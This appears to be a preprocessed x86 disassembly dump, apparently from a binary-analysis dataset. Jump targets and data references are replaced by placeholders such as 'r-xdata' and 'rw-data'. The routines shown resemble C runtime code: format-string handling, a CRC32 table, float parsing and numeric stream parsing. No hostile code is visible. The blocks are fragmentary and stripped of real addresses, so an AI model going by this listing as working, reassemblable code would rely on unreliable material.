movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10022954
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_10079c78
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10079c49
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_10008102
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_1007c490
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_10079c49
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_10079c49
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_10079b60
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_10022954
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10079c49
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_10049f42
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10003206
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10049ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008237e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x230 ]
push ebx
push ecx
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x230 ]
call sub_10048a90
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x238 ]
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x234 ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x238 ] ebx
jne r-xdata
push 0x1
call sub_10055606
add esp 0x4
push eax
lea ecx [ ebp - 0x240 ]
mov [ ebp - 0x240 ] ebx
mov [ ebp - 0x23c ] ebx
call sub_100304d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x240 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x230 ]
push ecx
lea esi [ ebp - 0x238 ]
call sub_10018d10
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov ebx [ ebp - 0x238 ]
call sub_1003ae80
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
mov eax esi
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea esi [ ebx + 0xe8 ]
lea edx [ ebp - 0x244 ]
mov eax 0x19
add ebx 0x104
call sub_10013830
lea edx [ ebp - 0x24 ]
mov eax 0x7b
call sub_10013830
fld [ ebp + 0x8 ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub esp 0x8
lea edx [ ebp - 0x24 ]
fstp [ esp ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov edx 0x4
call sub_1006c960
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
sub esp 0x8
lea ecx [ ebp - 0x24 ]
fstp [ esp ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov edx 0x4
call sub_1006c960
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
push esi
call sub_1005eea0
fld [ ebp + 0xc ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
call sub_10044190
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10044190
xor eax eax
call sub_10044190
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x6
jmp r-xdata
push ebx
call sub_1005eea0
lea ecx [ ebp - 0x238 ]
call sub_1003b980
test eax eax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x240 ]
je r-xdata
sub_1004a310
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
xor ecx ecx
test al 0x1
je r-xdata
xor eax 0xedb88320
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
mov eax ecx
shr eax 0x1
test cl 0x1
je r-xdata
or eax 0xffffffff
test edx edx
je r-xdata
mov [ ebp + ecx * 4 - 0x404 ] eax
inc ecx
cmp ecx 0x100
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
not eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
movzx ecx [ esi ]
xor ecx eax
and ecx 0xff
shr eax 0x8
xor eax [ ebp + ecx * 4 - 0x404 ]
inc esi
dec edx
jne r-xdata
sub_1004a3f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_100048cd
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1004fd6f
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_1004a419
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_1006a508
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_1001116c
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1001f26e
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_1004fd6f
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_1004a540
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_10069f30
mov esi [ esi ]
push ebx
call sub_1006591f
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_1004a589
push 0x6c
mov eax sub_1007f7ab
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1001fccb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_1003088d
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_100081b8
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_100231ee
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004fa89
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005576a
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_100081b8
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_100081b8
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005576a
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100081b8
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10041a20
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_10023e65
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_10023e65
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005576a
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
